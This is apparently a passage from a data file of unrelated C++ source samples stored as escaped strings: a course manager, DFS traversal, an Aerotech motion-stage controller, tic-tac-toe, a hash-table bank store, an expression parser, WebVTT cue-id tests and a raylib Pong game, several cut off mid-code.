endl;\n}\n\nvoid addCourse() {\n    if (numCourses == MAX_COURSES) {\n        cout << \"Error: Maximum number of courses reached!\" << endl;\n        return;\n    }\n    courses[numCourses].input();\n    numCourses++;\n    cout << \"Course added successfully!\" << endl;\n}\n\nvoid displayCourses() {\n    if (numCourses == 0) {\n        cout << \"No courses found!\" << endl;\n        return;\n    }\n    for (int i = 0; i < numCourses; i++) {\n        courses[i].display();\n    }\n}\n\nvoid searchCourse() {\n    if (numCourses == 0) {\n        cout << \"No courses found!\" << endl;\n        return;\n    }\n    int searchCode;\n    cout << \"Enter course code to search: \";\n    cin >> searchCode;\n    for (int i = 0; i < numCourses; i++) {\n        if (courses[i].code == searchCode) {\n            cout << \"Course found: \";\n            courses[i].display();\n            return;\n        }\n    }\n    cout << \"Course with code \" << searchCode << \" not found.\" << endl;\n}\n\nvoid updateCourse() {\n    if (numCourses == 0) {\n        cout << \"No courses found!\" << endl;\n        return;\n    }\n    int updateCode;\n    cout << \"Enter course code to update: \";\n    cin >> updateCode;\n    for (int i = 0; i < numCourses; i++) {\n        if (courses[i].code == updateCode) {\n            cout << \"Enter new information:\" << endl;\n            courses[i].input();\n            cout << \"Course information updated.\" << endl;\n            return;\n        }\n    }\n    cout << \"Course with code \" << updateCode << \" not found.\" << endl;\n}\n\nvoid deleteCourse() {\n    if (numCourses == 0) {\n        cout << \"No courses found!\" << endl;\n        return;\n    }\n    int deleteCode;\n    cout << \"Enter course code to delete: \";\n    cin >>",
    "#include<bits/stdc++.h>\r\nusing namespace std;\r\n\r\nvoid DFS(int node, vector<int> adj[], vector<int>& vis) {\r\n    vis[node] = 1; // Mark the current node as visited\r\n    cout << node << \" \"; // Print the current node\r\n\r\n    // Traverse all adjacent nodes\r\n    for(auto it : adj[node]) {\r\n        if(!vis[it]) {\r\n            DFS(it, adj, vis); // Recursively call DFS for unvisited adjacent nodes\r\n        }\r\n    }\r\n}\r\n\r\nint main() {\r\n    int n, e; // n is the number of nodes, e is the number of edges\r\n    cout << \"Enter number of nodes and edges: \";\r\n    cin >> n >> e;\r\n\r\n    vector<int> adj[n+1]; // Adjacency list for graph representation\r\n    vector<int> vis(n+1, 0); // Visited array to keep track of visited nodes\r\n\r\n    cout << \"Enter edges (from to):\" << endl;\r\n    for(int i = 0; i < e; i++) {\r\n        int u, v;\r\n        cin >> u >> v;\r\n        adj[u].push_back(v); // Adding edge from u to v (assuming 1-based indexing)\r\n        adj[v].push_back(u); // Adding edge from v to u for undirected graph\r\n    }\r\n\r\n    // Perform DFS from node 1 (assuming 1-based indexing)\r\n    cout << \"DFS Traversal starting from node 1:\" << endl;\r\n    DFS(1, adj, vis); // Starting DFS from node 1\r\n\r\n    return 0;\r\n}\r\n",
    "\ufeff#include \"aerotech.h\"\r\n#include \"direction.h\"\r\n#include \"visor.h\"\r\n#include <QDebug>\r\n#include <QThread>\r\n#include <QMessageBox>\r\n\r\nbool Aerotech::bStageAbortFlag = true;\r\n\r\nAerotech::Aerotech(QObject *parent)\r\n    : QObject{parent}\r\n{\r\n\r\n}\r\n\r\nAerotech::~Aerotech()\r\n{\r\n    if(A3200MotionDisable(handle, TASKID_Library, axisMask)\r\n       &&A3200Disconnect(handle))\r\n        qDebug()<<\"A3200 disconnected\";\r\n    else\r\n        qDebug()<<\"failed to disconnect A3200\";\r\n}\r\n\r\nbool Aerotech::aerotechQuery(AXISINDEX index, STATUSITEM item, DWORD status)\r\n{\r\n    double res;\r\n    A3200StatusGetItem(handle,index,item,status,&res);\r\n    //\u7528\u76f4\u63a5\u6267\u884c\u673a\u5668\u4ee3\u7801\u7684\u65b9\u5f0f\u4e5f\u53ef\u4ee5\uff0c\u4f8b\u5982\uff1a\r\n    //A3200CommandExecute(aerotech->handle, TASKID_Library, \"AxisStatus(X, DATAITEM_AxisStatus) & 0x00002000\", &result)\r\n    return (bool)res;\r\n}\r\n\r\nint Aerotech::aerotechWait(struct axisInfo& axis, int moveType)\r\n{\r\n    bool inPosition = false;\r\n    do\r\n    {\r\n       inPosition = aerotechQuery(axis.axis_index,STATUSITEM_AxisStatus,AXISSTATUS_WaitDone);\r\n       //inPosition = aerotechQuery(axis.axis_index,STATUSITEM_DriveStatus,DRIVESTATUS_InPosition);\r\n    }while(!(inPosition||Aerotech::bStageAbortFlag||VISoR::bStopFlag));\r\n    //\u6b63\u5e38\u5230\u8fbe\r\n    if(inPosition)\r\n    {\r\n        switch(moveType)\r\n        {\r\n        case moveToStartPos:\r\n            axis.nowPosition = axis.startPosition;\r\n            //qDebug().noquote()<<axis.axisName<<\"reached start position!\";\r\n            break;\r\n        case moveToEndPos:\r\n            axis.nowPosition = axis.endPosition;\r\n            //qDebug().noquote()<<axis.axisName<<\"reached end position!\";\r\n            break;\r\n        case moveToSetPos:\r\n            axis.nowPosition = axis.setPosition;\r\n            //qDebug().noquote()<<axis.axisName<<\"reached set position!\";\r\n            break;\r\n        default:break;\r\n        }\r\n        return 1;\r\n    }else   //\u610f\u5916\u7ec8\u6b62\r\n    {\r\n        A3200MotionAbort(handle,axis.axis_mask);\r\n        axis.nowPosition = axis.positionFeedback;\r\n        qWarning()<<axis.axisName<<\"abort!\";\r\n        return 0;\r\n    }\r\n}\r\n\r\nbool Aerotech::aerotechPosLock(int moveType,double paraX,double paraY,double paraZ)\r\n{\r\n    Q_UNUSED(paraZ);\r\n    Q_UNUSED(moveType);\r\n    Q_UNUSED(paraX);\r\n    Q_UNUSED(paraY);\r\n//    static const double limitZ_up = -2;                        //\u9ad8\u4e8e\u8fd9\u4e2a\u503c\u4f1a\u6709\u95ee\u9898\r\n//    static const double limitX_outer = 50,limitX_inner = 40;\r\n//    static const double limitY_outer = 50,limitY_inner = 40;\r\n//    //\u907f\u514dZ\u8f74\u4e0a\u5347\u65f6\uff0c\u8f7d\u7269\u53f0\u8fb9\u7f18\u4e0e\u7269\u955c\u76f4\u63a5\u649e\u51fb\r\n//    if(qAbs(paraX)>limitX_inner&&qAbs(paraX)<limitX_outer&&qAbs(paraY)>limitY_inner&&qAbs(paraY)<limitY_outer&&paraZ<limitZ_up)\r\n//        return false;\r\n//    else\r\n//    //\u907f\u514dZ\u8f74\u4e0a\u5347\u540e\uff0cXY\u65b9\u5411\u7684\u649e\u51fb\r\n//    switch(moveType)\r\n//    {\r\n//    //moveToEnd\u8981\u53c2\u8003startPosition\r\n//    case moveToEndPos:\r\n//        if(axisInfo_Z.startPosition<limitZ_up\r\n//        &&((qAbs(axisInfo_X.startPosition)<qAbs(limitX_inner)&&qAbs(axisInfo_Y.startPosition)<qAbs(limitY_inner)&&qAbs(paraX)>=qAbs(limitX_inner))\r\n//         ||(qAbs(axisInfo_X.startPosition)>qAbs(limitX_outer)&&qAbs(axisInfo_Y.startPosition)<qAbs(limitY_outer)&&qAbs(paraX)<=qAbs(limitX_outer))\r\n//         ||(qAbs(axisInfo_Y.startPosition)<qAbs(limitY_inner)&&qAbs(axisInfo_X.startPosition)<qAbs(limitX_inner)&&qAbs(paraY)>=qAbs(limitY_inner))\r\n//         ||(qAbs(axisInfo_Y.startPosition)>qAbs(limitY_outer)&&qAbs(axisInfo_X.startPosition)<qAbs(limitX_outer)&&qAbs(paraY)<=qAbs(limitY_outer))))\r\n//        {\r\n//            return false;\r\n//        }\r\n//        break;\r\n//    //\u4ee5\u4e0b2\u79cd\u76f4\u63a5\u53c2\u8003nowPosition\r\n//    case moveToStartPos:\r\n//    case moveToSetPos:\r\n//        if(axisInfo_Z.nowPosition<limitZ_up\r\n//        &&((qAbs(axisInfo_X.nowPosition)<qAbs(limitX_inner)&&qAbs(axisInfo_Y.nowPosition)<qAbs(limitY_inner)&&qAbs(paraX)>=qAbs(limitX_inner))\r\n//         ||(qAbs(axisInfo_X.nowPosition)>qAbs(limitX_outer)&&qAbs(axisInfo_Y.nowPosition)<qAbs(limitY_outer)&&qAbs(paraX)<=qAbs(limitX_outer))\r\n//         ||(qAbs(axisInfo_Y.nowPosition)<qAbs(limitX_inner)&&qAbs(axisInfo_X.nowPosition)<qAbs(limitX_inner)&&qAbs(paraY)>=qAbs(limitX_inner))\r\n//         ||(qAbs(axisInfo_Y.nowPosition)>qAbs(limitX_outer)&&qAbs(axisInfo_X.nowPosition)<qAbs(limitX_outer)&&qAbs(paraY)<=qAbs(limitX_outer))))\r\n//        {\r\n//            return false;\r\n//        }\r\n//        break;\r\n//    default:break;\r\n//    }\r\n    return true;\r\n}\r\n\r\n\r\n//\u56ca\u62ec3\u79cd\u8fd0\u52a8\uff0c\u672c\u8d28\u90fd\u662f\u5b9a\u4f4d\u8fd0\u52a8\uff0c\u4f46\u7ec6\u8282\u4e0d\u540c\uff0c\u53ef\u4ee5\u624b\u52a8\u4e2d\u65ad\r\nvoid Aerotech::aerotechRun(int moveType)\r\n{\r\n    switch(moveType)\r\n    {\r\n    case moveToStartPos:\r\n        A3200MotionMoveAbs(handle,TASKID_Library,axisInfo_X.axis_index,axisInfo_X.startPosition,axisInfo_X.setVelocity);\r\n        A3200MotionMoveAbs(handle,TASKID_Library,axisInfo_Y.axis_index,axisInfo_Y.startPosition,axisInfo_Y.setVelocity);\r\n        //qDebug()<<\"Axis_X and Axis_Y are moving to start position...\";\r\n\r\n        //\u5b9a\u4f4d\u8fd0\u52a8\u671f\u95f4\uff0c\u4e0d\u80fd\u63a5\u53d7\u70b9\u52a8\u6307\u4ee4\r\n        emit setStepButton(false);\r\n        Aerotech::bStageAbortFlag = false;\r\n\r\n        //XY\u8fd0\u52a8\u5230\u4f4d\uff0cZ\u5f00\u59cb\u8fd0\u52a8\r\n        if(aerotechWait(axisInfo_X,moveType)&aerotechWait(axisInfo_Y,moveType))\r\n        {\r\n        ",
    "\ufeff\r\n#include <iostream>\r\n#include <Windows.h>\r\n#include <graphics.h>\r\n#include <cstdlib> // \u5305\u542b\u4e86 srand \u548c rand \u51fd\u6570\u6240\u9700\u7684\u5934\u6587\u4ef6\r\n#include <ctime>   // \u5305\u542b\u4e86 time \u51fd\u6570\u6240\u9700\u7684\u5934\u6587\u4ef6\r\n#include <string>\r\n#include <conio.h>\r\n#include <tchar.h>\r\nusing namespace std;\r\n\r\n#define BOARD_SIZE 3\r\n#define EMPTY ' '\r\n#define PLAYER 'O'\r\n#define OPPONENT 'X'\r\n\r\nchar bf[8] = \"000:000\";\r\n\r\nint bifen[2] = {0,0};   // \u6bd4\u5206\r\n\r\ndouble win = 0;\r\n\r\n\r\n//\u8fdb\u4f4d\r\nvoid jinwei(char* c,int x)\r\n{\r\n    if (c[x] == ':')\r\n    {\r\n        c[x - 1] ++;\r\n        c[x] = '0';\r\n        if (c[x - 1] == ':')\r\n        {\r\n            c[x - 2]++;\r\n            c[x-1] = '0';\r\n        }\r\n    }\r\n}\r\n//\u753b\u53c9\r\nvoid fork1(int h, int l,int width=106)\r\n{\r\n    setlinestyle(PS_ENDCAP_ROUND, 10);\r\n    line(h+20,l-20,1.4*width+h-20,l-1.4*width+20);\r\n    line(h+20,l-1.4*width+20,h+1.4*width-20,l-20);\r\n}\r\n\r\n//\u753b\u5706\r\nvoid circle1(int h,int l,int r,int width=10)\r\n{\r\n    setlinestyle(PS_ENDCAP_ROUND,width);\r\n    circle(h+75,l-75,r-20);\r\n}\r\n\r\n//\u51fd\u6570\uff1a\u68c0\u67e5\u6e38\u620f\u662f\u5426\u80dc\u51fa\r\nchar checkWin(char board[BOARD_SIZE][BOARD_SIZE])\r\n{\r\n    //\u68c0\u67e5\u6a2a\u5411\r\n    if (board[0][0] == board[0][1] && board[0][1] == board[0][2] && board[0][2] != ' ')\r\n        return board[0][0];\r\n    if (board[1][0] == board[1][1] && board[1][1] == board[1][2] && board[1][2] != ' ')\r\n        return board[1][0];\r\n    if (board[2][0] == board[2][1] && board[2][1] == board[2][2] && board[2][2] != ' ')\r\n        return board[2][0];\r\n    //\u68c0\u67e5\u7eb5\u5411\r\n    if (board[0][0] == board[1][0] && board[1][0] == board[2][0] && board[2][0] != ' ')\r\n        return board[0][0];\r\n    if (board[0][1] == board[1][1] && board[1][1] == board[2][1] && board[2][1] != ' ')\r\n        return board[0][1];\r\n    if (board[0][2] == board[1][2] && board[1][2] == board[2][2] && board[2][2] != ' ')\r\n        return board[0][2];\r\n    //\u68c0\u67e5\u5bf9\u89d2\u7ebf\r\n    if (board[0][0] == board[1][1] && board[1][1] == board[2][2] && board[2][2] != ' ')\r\n        return board[1][1];\r\n    if (board[2][0] == board[1][1] && board[1][1] == board[0][2] && board[0][2] != ' ')\r\n        return board[1][1];\r\n    //\u68c0\u67e5\u6e38\u620f\u662f\u5426\u5e73\u5c40\r\n    int i, j;\r\n    for (i = 0; i < BOARD_SIZE; i++)\r\n    {\r\n        for (j = 0; j < BOARD_SIZE; j++)\r\n        {\r\n            if (board[i][j] == ' ')\r\n                return ' ';\r\n        }\r\n    }\r\n    //\u6e38\u620f\u5e73\u5c40\r\n    return 'N';\r\n}\r\n//\u68c0\u67e5\u662f\u5426\u5c06\u8981\u5931\u8d25\r\nint istofail(char board[3][3], int row, int col, char x) {\r\n    int count = 0;\r\n\r\n    // Check row\r\n    int rowCount = 0;\r\n    for (int i = 0; i < BOARD_SIZE; i++) {\r\n        if (board[row][i] == x) {\r\n            /*printf(\"%c\",x);*/\r\n            rowCount++;\r\n        }\r\n    }\r\n    if (rowCount == 2) {\r\n        /*printf(\"%d\u884c\\n\", row);*/\r\n        count++;\r\n    }\r\n    //else\r\n    //{\r\n    //    count = 0;\r\n    //}\r\n\r\n    // Check column\r\n    int colCount = 0;\r\n    for (int i = 0; i < BOARD_SIZE; i++) {\r\n        if (board[i][col] == x) {\r\n            colCount++;\r\n        }\r\n    }\r\n    if (colCount == 2) {\r\n        /*printf(\"%d\u5217\\n\",col);*/\r\n        count++;\r\n    }\r\n\r\n    // Check diagonal\r\n    if (row == col) {\r\n        int diagCount = 0;\r\n        for (int i = 0; i < BOARD_SIZE; i++) {\r\n            if (board[i][i] == x) {\r\n                diagCount++;\r\n            }\r\n        }\r\n        if (diagCount == 2) {\r\n            /*printf(\"\u659c\u6760\\n\");*/\r\n            count++;\r\n        }\r\n    }\r\n\r\n    // Check anti-diagonal\r\n    if (row + col == BOARD_SIZE - 1) {\r\n        int antiDiagCount = 0;\r\n        for (int i = 0; i < BOARD_SIZE; i++) {\r\n            if (board[i][BOARD_SIZE - 1 - i] == x) {\r\n                antiDiagCount++;\r\n            }\r\n        }\r\n        if (antiDiagCount == 2) {\r\n            /*printf(\"\u53cd\u659c\u6760\\n\");*/\r\n            count++;\r\n        }\r\n    }\r\n\r\n    return count;\r\n}\r\n\r\n\r\n//\u5224\u65ad\u662f\u5426\u662f\u5e73\u5c40\r\nbool  isTieScenarioForAnyPlayer(char board[BOARD_SIZE][BOARD_SIZE], char z)\r\n{\r\n    if (checkWin(board) == PLAYER || checkWin(board) == OPPONENT)\r\n    {\r\n        return false;\r\n    }\r\n    else\r\n    {\r\n        for (int i = 0; i < BOARD_SIZE; i++)\r\n        {\r\n            for (int j = 0; j < BOARD_SIZE; j++)\r\n            {\r\n                if (board[i][j] == ' ')\r\n                {\r\n                    board[i][j] = z;\r\n                    if (z == PLAYER)\r\n                    {\r\n                        if (isTieScenarioForAnyPlayer(board, OPPONENT) == false)\r\n                        {\r\n                            board[i][j] = ' ';\r\n                            return false;\r\n                        }\r\n                    }\r\n                    else\r\n                    {\r\n                        if (isTieScenarioForAnyPlayer(board, PLAYER) == false)\r\n                        {\r\n                            board[i][j] = ' ';\r\n                            return false;\r\n                        }\r\n                    }\r\n                    board[i][j] = ' ';\r\n                }\r\n            }\r\n        }\r\n    }\r\n    return true;\r\n}\r\n//\u8ba1\u7b97\u80dc\u7387\r\nvoid winning_rate(char board[BOARD_SIZE][BOARD_SIZE], char z, int bushu)\r\n{\r\n    if (checkWin(board) == PLAYER)\r\n    {\r\n        win += bushu + 1;\r\n    }\r\n    else if (checkWin(board",
    "#include \"Chaining.h\"\r\nusing namespace std;\r\n\r\nvoid Merge(vector<int> &arr, int start, int end){\r\n    int a=start;\r\n    int mid = (start + (end-start)/2);\r\n    int b=mid; \r\n    int insertat=0;\r\n    int thing[end-start];\r\n    while(a!=(mid) && b!=(end)){\r\n        if(arr[a]<=arr[b]){\r\n            thing[insertat]=arr[a];\r\n            a++; insertat++;\r\n        }\r\n        else{\r\n            thing[insertat]=arr[b];\r\n            b++; insertat++;\r\n        }\r\n    }\r\n    if(a!=mid){\r\n        for(int i=a; i<mid; i++){\r\n            thing[insertat]=arr[a];\r\n            a++; insertat++;\r\n        }\r\n    }\r\n    else if(b!=end){\r\n        for(int i=b; i<end; i++){\r\n            thing[insertat]=arr[b];\r\n            b++; insertat++;\r\n        }\r\n    }\r\n    for(int i=start; i<end; i++){\r\n        arr[i]=thing[i-start];\r\n    }\r\n}\r\n\r\nvoid MergeSort(vector<int> &arr,int start, int end){\r\n    if((end-start)!=1){\r\n        MergeSort(arr,start,(start + (end-start)/2));\r\n        MergeSort(arr,(start + (end-start)/2),end);\r\n        Merge(arr,start,end);\r\n    }\r\n}\r\n\r\nChaining::Chaining(){\r\n    p[0]=1;\r\n    for(int i=1; i<21; i++){\r\n        p[i]=((p[i-1]*31)%capacity);\r\n    }\r\n    bankStorage2d.resize(capacity);\r\n}\r\n\r\nint Chaining::hash(std::string id) {\r\n    int ans = 0;\r\n    for(int i=0; i<4; i++){\r\n        ans+=((id[i]-65)*p[i]);\r\n        ans = ans%capacity;\r\n    }\r\n    for(int i=4; i<11; i++){\r\n        ans+=((id[i]-48)*p[i]);\r\n        ans = ans%capacity;\r\n    }\r\n    for(int i=12; i<22; i++){\r\n        ans+=((id[i]-48)*p[i-1]);\r\n        ans = ans%capacity;\r\n    }\r\n    return ans; \r\n}\r\n\r\nvoid Chaining::createAccount(std::string id, int count) {\r\n    if(BaseSize>=(0.6 * capacity)){\r\n        capacity=capacity*2;\r\n        for(int i=1; i<21; i++){\r\n            p[i]=((p[i-1]*31)%capacity);\r\n        }\r\n        vector<vector<Account>> tempHash;\r\n        tempHash.resize(capacity);\r\n        for(int i=0; i<bankStorage2d.size(); i++){\r\n            if(bankStorage2d[i].size()>0){\r\n                for(Account x: bankStorage2d[i]){\r\n                    tempHash[hash(x.id)].push_back(x);\r\n                }\r\n            }\r\n        }\r\n        bankStorage2d = tempHash;\r\n    }\r\n    Account temp = {id,count};\r\n    int hval = hash(id);\r\n    bankStorage2d[hval].push_back(temp);\r\n    BaseSize++;\r\n}\r\n\r\nstd::vector<int> Chaining::getTopK(int k) {\r\n    vector<int> Sortcheck;\r\n    vector<int> ans;\r\n    for(int i=0; i<capacity; i++){\r\n        if(bankStorage2d[i].size()!=0){\r\n            for(Account x: bankStorage2d[i]){\r\n                Sortcheck.push_back(x.balance);\r\n            }\r\n        }\r\n    }\r\n    if(BaseSize==0){vector<int> v={}; return v;}\r\n    MergeSort(Sortcheck,0,Sortcheck.size());\r\n    if(Sortcheck.size()<=k){\r\n        for(int i=(Sortcheck.size()-1); i>=0; i-- ){\r\n            ans.push_back(Sortcheck[i]);\r\n        }\r\n    }\r\n    else for(int i=(Sortcheck.size()-1); i>=(Sortcheck.size()-k); i--){\r\n        ans.push_back(Sortcheck[i]);\r\n    }\r\n    return ans;\r\n}\r\n\r\nint Chaining::getBalance(std::string id) {\r\n    int hval = hash(id);\r\n    if(bankStorage2d[hval].size()!=0){\r\n        for(int i=0; i<bankStorage2d[hval].size(); i++){\r\n            if(bankStorage2d[hval][i].id==id){return bankStorage2d[hval][i].balance;}\r\n        }\r\n    }\r\n    return -1;\r\n}\r\n\r\nvoid Chaining::addTransaction(std::string id, int count) {\r\n    int hval = hash(id);\r\n    if(bankStorage2d[hval].size()==0){\r\n        createAccount(id,count);\r\n    }\r\n    else{\r\n        int c = 0;\r\n        for(int i=0; i<bankStorage2d[hval].size(); i++){\r\n            if(bankStorage2d[hval][i].id==id){\r\n                bankStorage2d[hval][i].balance+=count;\r\n                break;\r\n            }\r\n            else{c++;}\r\n        }\r\n        if(c==bankStorage2d[hval].size()){\r\n            createAccount(id,count);\r\n        } \r\n    }\r\n}\r\n\r\nbool Chaining::doesExist(std::string id) {\r\n    int hval = hash(id);\r\n    if(bankStorage2d[hval].size()!=0){\r\n        for(int i=0; i<bankStorage2d[hval].size(); i++){\r\n            if(bankStorage2d[hval][i].id==id){return true;}\r\n        }\r\n    }\r\n    return false; \r\n}\r\n\r\nbool Chaining::deleteAccount(std::string id) {\r\n    int hval = hash(id);\r\n    if(bankStorage2d[hval].size()!=0){\r\n        for(int i=0; i<bankStorage2d[hval].size(); i++){\r\n            if(bankStorage2d[hval][i].id==id){\r\n                bankStorage2d[hval].erase(bankStorage2d[hval].begin()+i); \r\n                BaseSize--;\r\n                return true;\r\n            }\r\n        }\r\n    }\r\n    return false;\r\n}\r\nint Chaining::databaseSize() {\r\n    return BaseSize;\r\n}\r\n\r\n",
    "#include <iomanip>\n#include <iostream>\n#include <queue>\n#include <string>\n\n\nusing namespace std;\n\nstruct Node\n{\n    char value;\n    Node* left;\n    Node* right;\n\n    Node(char val)\n    {\n        value  = val;\n        left = nullptr;\n        right = nullptr;\n    }\n};\n\nNode* parseExpression(string &eq, int &pos);\nNode* parseTerm(string &eq, int &pos);\nNode* parseFactor(string &eq, int &pos);\nstring Priority( string eq);\n\n\nbool ValidationFailed(string equation)\n{\n    bool Failed = false;\n    for (int i = 0; i < equation.size(); i++)\n    {\n        if ((ispunct(equation[0]) && equation[0] != '(') || (ispunct(equation[i]) && equation[i] !=')'  && ispunct(equation[i + 1])) || \n            (ispunct(equation[equation.size() - 1]) && equation[equation.size() - 1] != ')'))\n            return true;\n\n        else if (!((isdigit(equation[i]) || equation[i] == '+' || equation[i] == '-' || equation[i] == '*' || equation[\n            i] == '/' || equation[i] == '(' || equation[i] == ')' || isalpha(equation[i]))))\n\n            Failed = true;\n    }\n    return Failed;\n}\n\nNode* parseFactor(string& eq, int& pos)\n{\n    if (eq[pos] == '(')\n    {\n        pos++;\n        Node* node = parseExpression(eq, pos);\n        if (pos < eq.length() && eq[pos] == ')')\n        {\n            pos++;\n        }\n        else { throw runtime_error(\"Mismatched parentheses\"); }\n        return node;\n    }\n    else { return new Node(eq[pos++]); }\n}\n\nNode* parseTerm(string &eq, int &pos)\n{\n    Node* node = parseFactor(eq, pos);\n\n    while (pos < eq.length() && (eq[pos] == '*' || eq[pos] == '/'))\n    {\n        char op = eq[pos++];\n\n        Node* right = parseFactor(eq, pos);\n        Node* newNode = new Node(op);\n\n        newNode->left = node;\n        newNode->right = right;\n        node = newNode;\n    }\n    return node;\n}\n\n\nNode* parseExpression(string &eq, int &pos)\n{\n    if (ValidationFailed(eq))\n        throw runtime_error(\"Invalid equation\");\n\n\n    Node* node = parseTerm(eq, pos);\n    while (pos < eq.length() && (eq[pos] == '+' || eq[pos] == '-'))\n    {\n        char op = eq[pos++];\n\n        Node* right = parseTerm(eq, pos);\n        Node* newNode = new Node(op);\n\n        newNode->left = node;\n        newNode->right = right;\n\n        node = newNode;\n    }\n    return node;\n}\n\nvoid printParseTree(const Node* node, int indent = 0)\n{\n    if (node)\n    {\n        if (node->right)\n        {\n            printParseTree(node->right, indent + 4);\n        }\n        if (indent)\n        {\n            cout << setw(indent) << ' ';\n        }\n        if (node->right)\n        {\n            cout << \" /\\n\"\n                 << setw(indent) << ' ';\n        }\n        cout << node->value << \"\\n \";\n        if (node->left)\n        {\n            cout << setw(indent) << ' ' << \" \\\\\\n\";\n            printParseTree(node->left, indent + 4);\n        }\n    }\n}\n\n\nstring Priority(string s)\n{\n    if ((ispunct(s[0]) && s[0] != '('))\n                \n        throw runtime_error(\"Invalid equation\");\n    \n    queue<string> q;\n    string t;\n    int i = 0;\n\n    bool f = false;\n\n    while (!s.empty())\n    {\n\n        if((i = s.find(40)) && i != -1 || i == 0)\n        {\n            int end = s.find(')' );\n            if(end == -1)\n                throw runtime_error(\"Mismatched parentheses\");\n            \n            t = s.substr(i, end);\n            if(!ispunct(s[i-1]))\n                t += '*';\n            s.erase(i,end);\n            q.push(t);\n        }\n    \n        else if ((i = s.find('*')) && i != -1)\n        {\n            t = s.substr(i-1, 3);\n        \n            s.erase(i-1, 3);\n            q.push(t);\n\n            f = true;\n        }\n        else if ( (i = s.find('/')) && s.find('/') != string::npos)\n        {\n            t = s.substr(i-1, 3);\n       \n            s.erase(i-1, 3);\n            q.push(t);\n\n            f= true;\n        }\n\n        else if ((i = s.find('+')) && s.find('+') != string::npos)\n        {\n            t = s.substr(i-1, 3);\n            if(f)\n                reverse(t.begin(),t.end());\n        \n            s.erase(i-1, 3);\n\n            q.push(t);\n            f = false;\n        }\n\n        else if( (i = s.find('-')) && s.find('-') != string::npos)\n        {\n            t = s.substr(i-1, 3);\n            if(f)\n                reverse(t.begin(),t.end());\n        \n            s.erase(i-1, 3);\n            q.push(t);\n            f = false;\n        }\n\n        if(!s.empty() &&!ispunct(s[1]) && s.size() <= 2)\n            break;\n    }\n    string result = \"\";\n    while (!q.empty())\n    {\n        string temp = q.front();\n        \n        if(!result.empty())\n            if( result[result.size() - 1 ] == ')')\n                temp = temp.insert(0,\"+\");\n        \n        result += temp;\n        q.pop();\n    }\n    return result;\n}\n\nint main()\n{\n    while (true)\n    {\n        string equation;\n        cout << \"\\nEnter an equation: \";\n        getline(cin, equation);\n        equation.erase(remove_if(equation.begin(), equation.end(), ::isspace), equation.end());\n\n        if (equation.empty())\n      ",
    "#include \"cue_testfixture\"\nclass CueIdGeneral : public CueTest { };\n\n/**\n * Test to determine if the most basic one-character cue id passes\n *\n * From http://dev.w3.org/html5/webvtt/#webvtt-cue-identifier (11/24/2012)\n *\n * A WebVTT cue identifier is any sequence of one or more characters not\n * containing the substring \"-->\" (U+002D HYPHEN-MINUS, U+002D HYPHEN-MINUS,\n * U+003E GREATER-THAN SIGN), nor containing any U+000A LINE FEED (LF)\n * characters or U+000D CARRIAGE RETURN (CR) characters.\n *\n * Note: A WebVTT cue identifier can be used to reference a specific cue, for\n * example from script or CSS.\n */\nTEST_F(CueIdGeneral, BasicPass)\n{\n  loadVtt( \"cue-ids/basic_pass.vtt\", 1 );\n  EXPECT_EQ( 0, errorCount() ) << \"This file should contain no errors.\";\n}\n\n/**\n * Test to determine if a WEBVTT Cue Id allows a *very* large character input.\n * This test floods the cue ID with characters, but should pass\n *\n * From http://dev.w3.org/html5/webvtt/#webvtt-cue-identifier (11/24/2012)\n *\n * A WebVTT cue identifier is any sequence of one or more characters not\n * containing the substring \"-->\" (U+002D HYPHEN-MINUS, U+002D HYPHEN-MINUS,\n * U+003E GREATER-THAN SIGN), nor containing any U+000A LINE FEED (LF)\n * characters or U+000D CARRIAGE RETURN (CR) characters.\n *\n * Note: A WebVTT cue identifier can be used to reference a specific cue, for\n * example from script or CSS.\n */\nTEST_F(CueIdGeneral, LongString)\n{\n  loadVtt( \"cue-ids/long_string.vtt\", 1 );\n  EXPECT_EQ( 0, errorCount() ) << \"This file should contain no errors.\";\n}\n\n/**\n * Test if parser fails if the webvtt file only has a cue id (no timestamp or\n * payload)\n *\n * From http://dev.w3.org/html5/webvtt/#webvtt-cue-identifier (11/24/2012)\n *\n * A WebVTT cue identifier is any sequence of one or more characters not\n * containing the substring \"-->\" (U+002D HYPHEN-MINUS, U+002D HYPHEN-MINUS,\n * U+003E GREATER-THAN SIGN), nor containing any U+000A LINE FEED (LF)\n * characters or U+000D CARRIAGE RETURN (CR) characters.\n *\n * Note: A WebVTT cue identifier can be used to reference a specific cue, for\n * example from script or CSS.\n */\nTEST_F(CueIdGeneral, IdOnly)\n{\n  loadVtt( \"cue-ids/id_only.vtt\", 0 );\n  ASSERT_LE( 1, errorCount() ) << \"This file should contain at least 1 error\";\n  EXPECT_EQ( 1, errorCount() ) << \"This file should contain 1 error\";\n\n  expectEquals( getError( 0 ), WEBVTT_CUE_INCOMPLETE, 3, 2 );\n}\n",
    "#include \"raylib.h\"\n#include \"raymath.h\"\n#include <cmath>\n\nconst int screenWidth = 800;\nconst int screenHeight = 450;\n\nclass Ball {\npublic:\n\tVector2 position;\n\tVector2 velocity;\n\tfloat angle;\n\tint radius;\n};\n\nclass Paddle {\npublic:\n\tVector2 position;\n\tint height;\n\tint width;\n};\n\nBall ball;\nPaddle paddle;\n\nvoid InitGame();\nvoid DrawGame();\nvoid DrawBall(int size, Color color);\nvoid DrawPaddle(Color color);\nvoid MoveBall(int speed);\nvoid BallCollision();\n\nint main()\n{\n\tInitWindow(screenWidth, screenHeight, \"Pong\");\n\n\tInitGame();\n\n\tSetTargetFPS(60);\n\n\twhile (!WindowShouldClose())\n\t{\n\t\tBeginDrawing();\n\n\t\t\tDrawGame();\n\n\t\tEndDrawing();\n\t}\n\n\tCloseWindow();\n\n\treturn 0;\n}\n\nvoid InitGame()\n{\n\tball.position = Vector2{ screenWidth / 2, screenHeight / 2 };\n\tball.velocity = Vector2{ 0.5, 0.5 };\n\tball.radius = 12;\n\n\tpaddle.height = 100;\n\tpaddle.width = 20;\n\tpaddle.position = Vector2{ 50, (screenHeight / 2) };\n}\n\nvoid DrawGame()\n{\n\tClearBackground(RAYWHITE);\n\tDrawBall(ball.radius, LIGHTGRAY);\n\tDrawPaddle(LIGHTGRAY);\n}\n\nvoid DrawBall(int size, Color color)\n{\n\tDrawCircle(ball.position.x, ball.position.y, size, color);\n\tBallCollision();\n\tMoveBall(500);\n}\n\nvoid MoveBall(int speed)\n{\n\tball.position.x += ball.velocity.x * speed * GetFrameTime();\n\tball.position.y += ball.velocity.y * speed * GetFrameTime();\n}\n\nvoid BallCollision()\n{\n\tif (ball.position.x + (ball.radius / 2) >= screenWidth ||\n\t\tball.position.x - (ball.radius / 2) <= 0)\n\t{\n\t\tball.angle = 